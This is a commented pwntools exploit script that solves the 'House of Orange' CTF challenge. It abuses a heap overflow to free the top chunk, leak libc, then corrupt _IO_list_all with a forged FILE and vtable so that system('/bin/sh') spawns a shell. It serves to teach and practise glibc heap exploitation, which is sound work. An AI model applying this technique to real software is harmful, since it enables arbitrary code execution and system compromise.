'''
OG House of Orange Challenge. 
- http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = 'challenge'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p)
else: 
	p = remote(domain, port) 


def create_name(size, name):
	p.sendlineafter(">", "1") 
	p.sendlineafter(":", str(size)) 
	p.sendlineafter(":", str(name))
	p.recvuntil("at") 

	# Has the heap value inside of it.
	return p.recvline()
	
def see_name(leak=True): 
	p.sendlineafter(">", "3")
	p.recvuntil(":") 
	if(leak == True):
		p.recvline()
		name = p.recvline() 
	else: 
		name = p.recvline() 

	return name


def upgrade_name(size, name):
	p.sendlineafter(">", "2")
	p.sendlineafter(":", str(size)) 
	p.sendlineafter(":", str(name))
	return 

'''
The only bug in the program is a buffer overflow within the upgrade function of the name. We use this over and over again :)
'''
# Offsets for important things in the binary :)
IO_list_all_offset = 0x3c5520
libc_leak_offset = 0x3c5100
system_offset = 0x45390
FILE_offset = 0x540

##### Step 1: Overwrite the top_chunk #####
'''
- First, we create a name.
- With this name, we use the buffer overflow in the upgrade function to update the top_chunk's size. 
- The size (of the top chunk) has to meet the following constraints at https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L2392:
	- prev_inuse bit is set (easy) 
	- page aligned (medium)

Our goal is to trigger a heap extension, which frees the top_chunk into the unsorted bin. This is awesome beacause there are no frees in this program, by design. This allows the overflow to alter bin ptrs for a later attack.
'''
heap_leak = int(create_name(0x10, "Maxwell"),16) # Create the dummy name (rounds up to a 0x20 size)
heap_base = heap_leak - 0x10
print "Heap Leak: ", hex(heap_base)

# Calculate the location of the unsorted_bin chunk that we are using later on for the unsortd_bin attack.
FILE_location = heap_base + FILE_offset

'''
The above chunk has 0x10 bytes of data. 
So, the top_chunk is only 0x10 bytes away from the below chunk.
'''
fake_chunk = "A" * 0x10 # Filler before top_chunk
# Starting the overwrite of the top_chunk...
fake_chunk += "B" * 0x8 # The prev_size field (don't care what the value is)

'''
The size of this fake_chunk needs to be aligned with a page (0x1000) of what's currently been allocated.
So, 0x20 (from the first name allocated) gets subtracted from 0x1000, and a PREV_INUSE bit gets set.
'''
size = (0x1000 - 0x20) | 0x1 # Page aligned size and prev_inuse bit set.
fake_chunk += p64(size)

# Use this upgrade to overwrite the top_chunk size
upgrade_name(0x1000,fake_chunk)

##### Step 2: Place top_chunk into Unsorted Bin ####
'''
In order to force an extension, we need to ask malloc for a chunk larger than the current top_chunk size - 0x10 (metadata).

This allocation triggers the extension, placing the top_chunk as a normal chunk in the unsorted bin.

This value (given back to us) gets a chunk from the new section extension (not important).
'''
create_name(0x1000 - 0x20,"") # Force the extension


##### Step 3: LibC Leak ########## 
'''
When a chunk is in the unsorted bin, it has two important pointers: 
- fd
- bk

However, they are not cleaned up after a chunk has been used from the bin. So, this allows, if uninitialized, to be used as a LibC leak. 

The 'read' is not null terminated. So, adding an item with no or limited text will leak data. 
'''
create_name(0x512, "") # Fun fact: this particular allocation can ALSO lead to a heap leak. But, it was given at the beginning of the program. This is because a large chunk will force this NOT to be taken from the unsorted bin, but the large bin. Thus, the fd_nextsize and bk_nextsize are set.

# Leak LibC to get offsets for everything else.
name = see_name().replace("\n","")
libc_leak = u64("\x00" + name + "\x00\x00") 
libc_base = libc_leak - libc_leak_offset
print "LibC_Base: ",  hex(libc_base)

IO_list_all = libc_base + IO_list_all_offset
print "IO_list_all: ", hex(IO_list_all)

system = libc_base + system_offset
print "System: ", hex(system)

#### Step 4: Prepare the Unsorted Bin Chunk for Code Execution ####
'''
In chronological order (in terms of execution): 

Malloc order: 
- Getting a chunk (with a size not currently in the bin) will cause us to go into the unsorted bin. 
- This will take us to 

Use the unsorted bin attack to overwrite _IO_list_all: 
- This is the pointer to all file descriptors in the program (in LibC).
- Overwriting this eventually gives us access to a vtable (table of function pointers to play with). 
- To overwrite this, we set the bk pointer (of the unsorted_bin chunk) to the location of _IO_list_all - 0x10 (the fd offset is used for the write what WHERE).

The chunk gets put into the small bin[4] (we overwrite the size of the chunk in order to do this)
- Now that the _IO_list_all points to main_arena, how will it function? 
- The only thing that we care about is the _chain variable (which points to a lis of FILE's) at offset 0x68.
- The reason the chunk is put into small_bin[4] is because the offset happens to line up perfectly with the _chain variable. This corresponds to a size of 0x60.

Upon having an invalid chunk, the program crashes. 

Upon crashing, LibC calls _IO_Overflow from the vtable for all fds in the _chain variable. So, if we can control this vtable, we can control the program.
- The _chain will point to the unsorted_bin chunk (which we control). 
- The important offsets: 
	- 0x0: The input parameter into the _IO_Overflow 
	- 0x20: _IO_write_base (needs to be less than the next value at 0x28)
	- 0x28: _IO_write_ptr (needs to be more than the above value at 0x20)
	- 0xc0: mode (needs to be 0 or less)
	- 0xd8: jump_table (function pointers!). Needs to have a pointer to a list of function pointers.

Once the _IO_overflow (offset 0x18 in the vtable) is called it will use unsorted_bin[0] (if needed). If all has gone well, we should have code execution! :)
'''

fake_chunk = "A" * 0x510 # Filler to get to the unsorted_bin chunk

#### Starting the FILE ptr writing and the unsorted_bin chunk overwrite (they are intertwinned) ###

# This is the parameter for system, used in the _IO_overflow call.
fake_chunk += "/bin/sh\x00" # 0x0 (FILE[1] or chunk->prev_size)

# Corresponds with the size of small_bin[4] for being the _chain ptr.
fake_chunk += p64(0x61) # 0x8 (FILE[1] or chunk->size)

# The fd ptr, which does not matter in this attack.
fake_chunk += p64(0x0) # 0x10 (FILE[2] or chunk->fd)

# The location that the unsorted_bin attack will write to with the value being the main_arena.
fake_chunk += p64(IO_list_all - 0x10) # 0x18 (FILE[3] or chunk->bk)

# The FILE->_IO_write_base (must be less than offset 0x28)
fake_chunk += p64(1) # 0x20 (FILE[4])

# The FILE->_IO_write_ptr (must be greater than offset 0x20
fake_chunk += p64(2) # 0x28 (FILE[5])

# The _mode part of the FILE ptr, which lives at offset 0xc0. We will use a filler of 0xc0 - 0x30 (this is because we are currently located at this position)
fake_chunk += "A" * (0xc0 - 0x30)
fake_chunk += p64(0x0) # 0xc0 (FILE->_mode)

# The jump_table lives at offset 0xd8. So, we need to fill it with 0x10 bytes before it. 
# The location of the jump_table will be directly after the jump_table itself.
FILE_location = FILE_location + 0xd8 + 8 # Location of our jump table.
fake_chunk += "B" * (0xd8 - 0xc8)
fake_chunk += p64(FILE_location) # 0xd8. FILE->jump_table

# The first 3 entries for the jump_table are not needed. So, we use a filler.
fake_chunk += "C" * 0x18 # Filler prior to the _IO_overflow function in the vtable.
fake_chunk += p64(system)

# Update the unsorted_bin chunk to overwrite and create the fake values.
upgrade_name(0x1000, fake_chunk)

# Trigger the final call to malloc. This triggers all of the crazy stuff up above that we setup.
# LibC will crash, throw an error, then pop a shell :)
p.sendlineafter(">", str(1)) 
p.sendline(str(10)) # Trigger all of the craziness to happen :)


p.interactive()


